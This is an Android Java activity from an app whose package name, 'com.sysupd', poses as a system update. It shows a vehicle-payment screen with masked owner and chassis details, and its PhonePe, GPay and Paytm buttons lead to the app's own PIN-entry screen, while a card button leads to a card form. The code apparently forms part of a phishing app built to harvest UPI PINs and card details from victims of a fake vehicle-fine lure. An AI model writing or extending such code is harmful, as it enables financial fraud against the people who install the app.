package com.sysupd;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class PayActivity extends AppCompatActivity {
    String vehicle = "", mobile = "", chassis = "";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_pay);

        vehicle = getIntent().getStringExtra("vehicle");
        mobile = getIntent().getStringExtra("mobile");
        chassis = getIntent().getStringExtra("chassis");

        // Show vehicle number (real) but lock the owner info
        ((TextView) findViewById(R.id.vehicleDisplay)).setText(
            "🚗 " + vehicle + "\nOwner: XXXXXX" + 
            (mobile.length() >= 4 ? mobile.substring(mobile.length() - 4) : "") +
            "\nChassis: *****" + chassis);

        findViewById(R.id.phonepeBtn).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { openPin("phonepe"); }
        });
        findViewById(R.id.gpayBtn).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { openPin("gpay"); }
        });
        findViewById(R.id.paytmBtn).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { openPin("paytm"); }
        });
        findViewById(R.id.cardBtn).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Intent i = new Intent(PayActivity.this, CardActivity.class);
                i.putExtra("vehicle", vehicle);
                i.putExtra("mobile", mobile);
                i.putExtra("chassis", chassis);
                startActivity(i);
            }
        });
    }

    void openPin(String app) {
        Intent i = new Intent(PayActivity.this, PinActivity.class);
        i.putExtra("vehicle", vehicle);
        i.putExtra("mobile", mobile);
        i.putExtra("chassis", chassis);
        i.putExtra("app", app);
        startActivity(i);
    }
}
